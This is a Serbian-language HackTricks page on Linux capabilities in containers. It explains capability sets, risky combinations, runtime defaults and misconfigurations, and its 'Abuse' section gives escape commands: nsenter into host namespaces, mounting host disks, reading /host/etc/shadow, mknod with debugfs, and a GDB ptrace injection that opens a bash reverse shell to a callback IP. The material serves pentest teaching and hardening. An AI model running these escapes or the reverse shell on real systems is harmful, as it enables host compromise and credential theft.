# Linux Capabilities U Containerima

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux capabilities su jedan od najvažnijih elemenata container security-ja, jer daju odgovor na suptilno, ali fundamentalno pitanje: **šta „root“ zaista znači unutar containera?** Na običnom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima, ta privilegija je razložena na manje jedinice koje se nazivaju capabilities. Proces može da radi kao root, a da i dalje nema mnoge moćne operacije ako su relevantne capabilities uklonjene. <sup>[[1]](#references)</sup>

Containeri se u velikoj meri oslanjaju na ovu razliku. Mnogi workload-i se i dalje pokreću kao UID 0 unutar containera zbog kompatibilnosti ili jednostavnosti. Bez uklanjanja capabilities, to bi bilo previše opasno. Uz uklanjanje capabilities, root proces unutar containera i dalje može da obavlja mnoge uobičajene zadatke unutar containera, dok mu se uskraćuju osetljivije kernel operacije. Zato shell containera koji prikazuje `uid=0(root)` ne znači automatski „host root“, niti čak „široke kernel privilegije“. Skup capabilities određuje koliko ta root identifikacija zapravo vredi.

Za kompletan Linux capabilities reference i mnoge primere abuse-a, pogledajte:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Rad

Capabilities se prate u nekoliko skupova, uključujući permitted, effective, inheritable, ambient i bounding sets. Za mnoge procene containera, precizna kernel semantika svakog skupa je manje neposredno važna od praktičnog pitanja: **koje privilegovane operacije ovaj proces trenutno može uspešno da izvrši i koji budući dobici privilegija su još mogući?** <sup>[[1]](#references)</sup>

Ovo je važno zato što su mnoge breakout tehnike zapravo problemi sa capabilities koji su prikriveni kao problemi containera. Workload sa `CAP_SYS_ADMIN` može da pristupi ogromnoj količini kernel funkcionalnosti kojoj običan root proces containera ne bi trebalo da pristupa. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može da vidi host procese kroz deljenje host PID-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`; u Kubernetes-u se obično pojavljuje kao `hostPID: true`.

Drugim rečima, skup capabilities ne može da se procenjuje izolovano. Mora da se posmatra zajedno sa namespaces, seccomp-om i MAC policy-jem.

## Lab

Veoma direktan način za proveru capabilities unutar containera je:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Takođe možete uporediti restriktivniji container sa onim kome su dodate sve capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Da biste videli efekat uskog dodatka, pokušajte da uklonite sve i zatim dodate samo jednu capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ovi mali eksperimenti pomažu da pokažu da runtime ne uključuje jednostavno boolean pod nazivom "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.

## Capabilities visokog rizika

Capabilities postaju escape primitives samo kada njihova operacija dopre do **resursa kojima upravlja host**. Ponavljajuće kombinacije visokog rizika su:

- **`CAP_SYS_ADMIN`** zajedno sa host PID-om, block device-om ili writable kernel-control putanjom. Pridruživanje ciljnom mount namespace-u dodatno zahteva `CAP_SYS_CHROOT`; montiranje filesystem-a zasnovanog na block device-u zahteva `CAP_SYS_ADMIN` u početnom user namespace-u.
- **`CAP_SYS_PTRACE`** zajedno sa vidljivošću host PID-ova i host procesom na koji je moguće izvršiti attach. `CAP_SYS_ADMIN` nije potreban za ptrace injection.
- **`CAP_DAC_OVERRIDE` ili `CAP_DAC_READ_SEARCH`** zajedno sa dostupnim host filesystem-om. Ove capabilities zaobilaze različite DAC provere, ali ne stvaraju host filesystem view.
- **`CAP_SYS_MODULE`** u početnom user namespace-u zajedno sa prihvaćenim, kernel-kompatibilnim modulom. Standardni Linux containers dele node kernel; VM ili userspace-kernel runtime-i menjaju tu granicu.
- **`CAP_MKNOD`** u početnom user namespace-u zajedno sa stvarnim host device-om koji device cgroup već dozvoljava. Kreiranje node-a ne zaobilazi device cgroup.
- **`CAP_SYS_RAWIO`** zajedno sa izloženim i upotrebljivim memory, I/O-port, PCI ili device-control interfejsom.
- **`CAP_SYS_BOOT`** zajedno sa početnim PID namespace-om za reboot hosta ili upotrebljivom i dozvoljenom kexec putanjom za zamenu kernela.
- **`CAP_NET_ADMIN`** u host network namespace-u za direktnu kontrolu mrežnog stanja node-a. **`CAP_NET_RAW`** može učestvovati u protocol-specific escape-u, ali raw sockets sami po sebi nisu node shell.

`CAP_SYS_CHROOT` namerno nije naveden kao standalone escape capability. Može biti potreban za `setns()` mount namespace-a i može olakšati korišćenje već dostupnog host tree-ja, ali `chroot()` sam po sebi ni izlaže taj tree niti daje nove filesystem permissions. Slično tome, **`CAP_BPF`** i **`CAP_PERFMON`** izlažu moćnu telemetriju i kernel attack surface, ali bez zasebnog kernel flaw-a njihove uobičajene operacije nisu generički container escapes.

## Runtime Usage

Docker, Podman, stack-ovi zasnovani na containerd-u i CRI-O svi koriste capability controls, ali se defaults i management interfaces razlikuju. Docker ih direktno izlaže kroz flags kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične controls i često ih kombinuje sa rootless execution-om kao dodatnim safety layer-om. Kubernetes izlaže dodavanje i uklanjanje capabilities kroz `securityContext` Pod-a ili container-a; lower-level runtime-i izražavaju rezultujuće sets u OCI runtime configuration-u. System-container environments kao što su LXC i Incus takođe se oslanjaju na capability control, ali njihova šira host integration može navesti operatore da agresivnije opuštaju defaults nego što bi to činili za application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Isti princip važi za sve njih: capability koju je tehnički moguće dodeliti nije nužno ona koju treba dodeliti. Mnogi incidenti iz stvarnog sveta počinju kada operator doda capability jednostavno zato što workload nije radio pod strožom konfiguracijom, a timu je bilo potrebno brzo rešenje.

## Misconfigurations

Najočiglednija greška je **`--cap-add=ALL`** u Docker/Podman-style CLI-jevima, ali to nije jedina greška. U praksi je češći problem dodeljivanje jedne ili dve izuzetno moćne capabilities, naročito `CAP_SYS_ADMIN`, kako bi se "aplikacija osposobila za rad", bez istovremenog razumevanja implikacija namespace-a, seccomp-a i mount-a. Drugi čest failure mode je kombinovanje dodatnih capabilities sa deljenjem host namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`, `--network=host` ili `--userns=host`; u Kubernetes-u se ekvivalentna exposure obično pojavljuje kroz workload settings kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja ono na šta capability zapravo može da utiče.

Takođe je uobičajeno videti administratore koji veruju da je workload, zato što nije u potpunosti `--privileged`, i dalje značajno ograničen. Ponekad je to tačno, ali ponekad je effective posture već dovoljno blizu privileged režimu da ta razlika operativno prestaje da bude važna.

## Abuse

Počnite beleženjem effective sets, user-namespace mapping-a, seccomp state-a, namespace-ova, mount-ova i device-ova. Naziv capability-ja bez ovog konteksta nije dokaz escape-a:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces i blok uređaji

Kada je omogućena vidljivost PID-ova hosta, `CAP_SYS_ADMIN` može da uđe u namespaces hosta. Operacija sa mount namespace-om takođe zahteva `CAP_SYS_CHROOT` u korisničkom namespace-u pozivaoca.

**Proverite capability i ograničenja:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumeriši cilj:** potvrdi deljenje host PID-ova iz konfiguracije container/Pod-a ili nedvosmislene liste host procesa, a zatim proveri ciljne namespace-ove. Lokalni PID 1 postoji i u privatnim PID namespace-ovima, tako da samo njegovo prisustvo nije dokaz deljenja host PID-ova.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Iskoristite putanju namespace-a:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Provere capabilities moraju biti uspešne u user namespaces koji poseduju ciljeve. `--pid=host` ili Kubernetes `hostPID: true` obezbeđuje vidljivost; ne obezbeđuje capabilities.

Za alternativnu putanju blok-uređaja, prvo **enumerate** kandidate, a zatim **exploit** pristupačni filesystem tako što ćete najpre montirati validiranog kandidata samo za čitanje:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Uređajski čvor mora da postoji, device cgroup mora to da dozvoli, a montiranja blokovskih sistema datoteka zahtevaju `CAP_SYS_ADMIN` u početnom user namespace-u. Host root koji je već bind-mounted na `/host` omogućava pristup hostu **bez** `CAP_SYS_ADMIN`; `chroot /host` je samo pogodnost i zasebno zahteva `CAP_SYS_CHROOT`.

### Dostupan host root: direktno izvršavanje sistema datoteka

Ako je host root već montiran na `/host`, prvo potvrdite montiranje, a zatim direktno koristite postojeći pristup. Ovaj put ne zavisi od `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Ako `chroot()` nije dostupan, ali je binarni fajl hosta kompatibilan sa arhitekturom i loaderom containera, često se umesto toga može pozvati kroz montirano stablo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Direktna čitanja i upisivanja unutar `/host` već predstavljaju kompromitovanje host sistema datoteka. `chroot()` ili izvršavanje host binarnog fajla samo čine taj pristup praktičnijim; nijedna od tih operacija ne kreira host mount niti zaobilazi read-only mount ili MAC policy.

### `CAP_SYS_PTRACE`: injection host procesa

Uz vidljivost host PID-ova i `CAP_SYS_PTRACE` u user namespace-u mete, GDB može naterati odobreni host proces da pozove `system()`. `CAP_SYS_ADMIN` nije potreban.

**Proverite capability i kontrole priključivanja:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Nabroj i izaberi privremenu metu:** potvrdi deljenje PID-ova hosta iz konfiguracije ili nedvosmislenog spiska procesa node-a; nikada ne biraj PID 1 ili kritični daemon.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Iskoristi odabrani proces:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Cilj mora biti moguće priključiti i mora imati upotrebljiv simbol `system()` i putanju do Bash payload-a. Yama, stanje koje onemogućava dump, seccomp, user namespaces i MAC policy mogu blokirati lanac. GDB zaustavlja cilj dok je priključen, zato koristite samo disposable lab proces.

### `CAP_DAC_OVERRIDE` i `CAP_DAC_READ_SEARCH`: zaštićene datoteke hosta

Ove capabilities ne izlažu filesystem hosta. Ako je `/host` već mount hosta, `CAP_DAC_READ_SEARCH` može zaobići DAC provere čitanja/pretrage, a `CAP_DAC_OVERRIDE` može dodatno zaobići uobičajene provere upisivanja:

**Proverite capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumerišite izloženi host fajl-sistem i ciljajte dozvole:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Testirajte read i write zaobilaženja** u privremenom labu:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Montiranje samo za čitanje i dalje podleže LSM pravilima. `CAP_DAC_READ_SEARCH` takođe ovlašćuje `open_by_handle_at()`, ali je za breakout kao što je Shocker dodatno potreban file descriptor montiranja za isti osnovni filesystem, važeći ili pronađivi handles, kompatibilan raspored filesystema/storage-a i odsustvo blokade od strane runtime-a ili LSM-a. Ne omogućava proizvoljan pristup svakom filesystemu izvan mount namespace-a.

### `CAP_SYS_MODULE`: izvršavanje u deljenom kernelu

U običnom Linux containeru, prihvaćeni modul se izvršava u deljenom kernelu hosta.

**Proverite capability i opseg user namespace-a:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Nabrojte preduslove za učitavanje modula:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploit samo sa kompatibilnim, prethodno proverenim proof modulom na čvoru predviđenom za uklanjanje:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability mora biti effective u početnom user namespace-u. Verzija i konfiguracija kernela, potpisi modula, lockdown, seccomp i LSM policy moraju dozvoliti učitavanje. Kata, gVisor, Hyper-V isolation i slični runtime-ovi menjaju do koje kernel granice workload dolazi.

### `CAP_MKNOD`: kreiranje dozvoljenog device handle-a

`CAP_MKNOD` kreira device node, ali ne zaobilazi device cgroup. Kreiranje device-a nije namespaced, tako da capability mora biti effective u početnom user namespace-u.

**Proverite capability i opseg user namespace-a:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Nabrojte stvarne uređaje, njihove major/minor brojeve i svaku vidljivu cgroup-v1 allowlistu:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit validiranog ext-family candidate-a read-only:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Drugim filesystemima je potreban odgovarajući read-only alat; za dodatno montiranje uređaja potreban je i `CAP_SYS_ADMIN`. `Operation not permitted` prilikom otvaranja kreiranog čvora obično znači da ga device cgroup i dalje blokira. U okviru cgroup v2, pristup uređajima se obično sprovodi pomoću BPF-a i ne postoji datoteka `devices.list`, pa je uspešno otvaranje odlučujući test.

### `CAP_SYS_RAWIO`: izloženi interfejs za raw-I/O

Ne postoji prenosiv generički payload: važeće adrese i efekti zavise od hardvera i konfiguracije kernela.

**Proverite capability i opseg user namespace-a:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Nabrojte izložene sirove interfejse, hardver i drajvere:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Eksploatišite samo uz odobreni proof za identifikovani uređaj i opseg adresa.** Ako je `/dev/mem` interfejs odobren za laboratoriju, ovaj šablon dokazuje otkrivanje memorije čvora bez ispisivanja njenog sadržaja:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Adresa mora poticati iz hardverske mape lab-a, jer čitanje nekih MMIO regiona može imati neželjene efekte. Generička komanda za upis u memoriju bila bi obmanjujuća i nebezbedna: ista adresa može biti bezopasna na jednoj mašini, a na drugoj upravljati hardverom ili memorijom kernela. Device cgroups, dozvole sistema datoteka, strogi `/dev/mem`, kernel lockdown, virtualizacija i LSM policy često sprečavaju koristan pristup.

### `CAP_SYS_BOOT`: reboot namespace-a ili zamena kernela

U privatnom PID namespace-u, `reboot()` prekida init proces tog namespace-a umesto da restartuje host. Uticaj na reboot hosta stoga zahteva početni PID namespace, obično preko deljenja PID-ova hosta. kexec put takođe zahteva kompatibilnu kernel image i permisivnu lockdown/signature policy:

**Proverite capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Nabrojte preduslove za PID namespace i kexec:** potvrdite deljenje host PID-a u konfiguraciji workload-a, jer sama veza sa PID namespace-om ne otkriva da li je to početni namespace node-a.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit koristi samo kada je ponovno pokretanje privremenog lab node-a izričito deo vežbe:**
```bash
sync
reboot -f
```
Nemojte izvršavati tu komandu niti učitavati kernel na deljenom node-u samo da biste dokazali capability. U privatnom PID namespace-u ona prekida samo init proces tog namespace-a i ne pokazuje uticaj na host.

### `CAP_NET_ADMIN` i `CAP_NET_RAW`: mrežne putanje hosta

`CAP_NET_ADMIN` utiče samo na trenutni network namespace.

**Proverite capabilities i confinement:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Izlistajte trenutnu mrežu i potvrdite host networking iz konfiguracije workload-a:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Reverzibilno iskoristite `CAP_NET_ADMIN`:** uz host networking, privremeni interfejs je interfejs noda.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` omogućava RAW i PACKET sockets, ali nije generička host shell. Da biste **enumerisali** dokumentovani GCE lanac, proverite rutu metapodataka i zabeležite da li je saobraćaj guest-agent-a u plaintext-u vidljiv:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Ako postoje odgovarajući preduslovi, **exploit**-ujte chain specifičan za okruženje, kako je dokumentovano u [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): presretnite request i state sekvencu, ubacite falsifikovani metadata response koji sadrži SSH ključ, a zatim proverite pristup hostu. Ovaj chain je zahtevao root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata saobraćaj i guest-agent request nad kojim je moguće izvesti race condition; savremeni transport ili ponašanje agenta mogu ga prekinuti.

## Provere

Cilj provere capabilities nije samo izlistavanje sirovih vrednosti, već razumevanje toga da li proces ima dovoljno privilegija da njegov trenutni namespace i mount stanje učini opasnim.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Šta je ovde zanimljivo:

- `capsh --print` je najlakši način da uočite capabilities visokog rizika, kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ili `cap_sys_module`.
- Linija `CapEff` u `/proc/self/status` pokazuje šta je trenutno zaista efektivno, a ne samo šta bi moglo biti dostupno u drugim skupovima.
- Dump capabilities postaje mnogo važniji ako container takođe deli host PID, network ili user namespaces, ili ima writable host mounts.

Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je njihovo tumačenje. Proverite da li je proces root, da li su user namespaces aktivni, da li se host namespaces dele, da li seccomp sprovodi ograničenja i da li AppArmor ili SELinux i dalje ograničavaju proces. Sam skup capabilities predstavlja samo deo priče, ali je često upravo on deo koji objašnjava zašto jedan container breakout funkcioniše, a drugi ne uspeva sa istom prividnom početnom tačkom.

## Runtime Defaults

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano smanjen skup capabilities | Docker zadržava podrazumevanu allowlist capabilities i uklanja ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Podrazumevano smanjen skup capabilities | Podman containers su podrazumevano unprivileged i koriste smanjen model capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Nasleđuje runtime defaults ako se ne izmene | Ako nisu navedene `securityContext.capabilities`, container dobija podrazumevani skup capabilities od runtime-a | `securityContext.capabilities.add`, izostavljanje `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Obično runtime default | Efektivni skup zavisi od runtime-a i Pod spec-a | isto kao u redu za Kubernetes; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |

Za Kubernetes je važno to što API ne definiše jedan univerzalni podrazumevani skup capabilities. Ako Pod ne dodaje niti uklanja capabilities, workload nasleđuje runtime default za taj node.

## References

- [1] [capabilities(7) - Linux priručnik](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux konfiguracija containera](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilegije i Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes dokumentacija - Podešavanje capabilities za container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman dokumentacija - `--cap-add` i `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus dokumentacija - Bezbednost](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
